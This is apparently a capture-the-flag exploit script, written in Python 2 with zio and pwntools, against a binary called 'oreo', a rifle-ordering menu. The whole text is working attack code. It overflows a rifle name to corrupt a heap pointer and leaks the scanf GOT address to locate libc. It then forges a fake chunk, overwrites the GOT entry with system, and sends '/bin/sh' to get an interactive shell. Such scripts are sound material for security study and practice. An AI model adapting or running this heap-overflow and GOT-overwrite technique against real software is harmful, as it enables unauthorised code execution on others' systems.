from zio import *
from pwn import *
target = "./oreo"
elf_path = "./oreo"

def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	#io = process(target, timeout = 9999, shell = True)
	return io

def get_elf_info(elf_path):
	return ELF(elf_path)

def add_new_rifle(io, name, description):
	#print io.read_until(banner)
	io.write("1\n")
	#io.read_until("Rifle name: ")
	io.write(name + "\n")
	#io.read_until("Rifle description: ")
	io.write(description + "\n")

def show_rifle(io):
	#print io.read_until(banner)
	io.write("2\n")

def order_rifle(io):
	#io.read_until(banner)
	io.write("3\n")

def leave_message(io, message):
	#io.read_until(banner)
	io.write("4\n")
	#io.read_until("Enter any notice you'd like to submit with your order:")
	io.write(message + "\n")

def show_cur_stats(io):
	#io.read_until(banner)
	io.write("5\n")


def pwn(io):
	elf_info = get_elf_info(elf_path)

	print io.read_until("6. Exit!\n")

	scanf_got = 0x0804a258

	func_use_got = scanf_got

	name = "pxx"
	description = "nihao"
	count_left = 3
	for i in range(0x41 - count_left):#set add_count_size = 0x41
		add_new_rifle(io, name, description)#node1


	order_rifle(io)#delete all node
	
	next_ptr = func_use_got
	name = "a" * 27 + l32(next_ptr) #leak info
	description = "description" 
	print len(description)
	#io.gdb_hint()
	add_new_rifle(io, name, description)#node1 overwrite node2
	
	show_rifle(io)
	io.read_until("Description: ")
	io.read_until("Description: ")
	data = io.read(4)
	print hex(l32(data))

	func_use_real_addr = l32(data)

	offset___isoc99_sscanf = 0x00061e10
	offset_system = 0x0003e800

	offset_func_use = offset___isoc99_sscanf
	is_know = True
	if is_know == False:
		offset_func_use = int(raw_input("offset_func_use:"), 16)
		offset_system = int(raw_input("offset_system:"), 16)

	libc_addr = func_use_real_addr - offset_func_use
	system_read_addr = libc_addr + offset_system

	next_ptr = 0x804a2a8 - 0x08 #message_addr fake node

	name = "a" * 27 + l32(0x0)
	name += l32(0x0) + l32(0x41) + l32(next_ptr)
	description = "description" 
	print len(description)
	add_new_rifle(io, name, description)#node1 overwrite node2
	
	name = "pxx"
	add_new_rifle(io, name, description)#alloc node2 set fake node3

	description = l32(func_use_got)
	#io.gdb_hint()
	add_new_rifle(io, name, description)#alloc fakenode3

	message = l32(system_read_addr)
	leave_message(io, message)
	io.write("/bin/sh;\n")

	io.interact()	

io = get_io(target)
pwn(io)

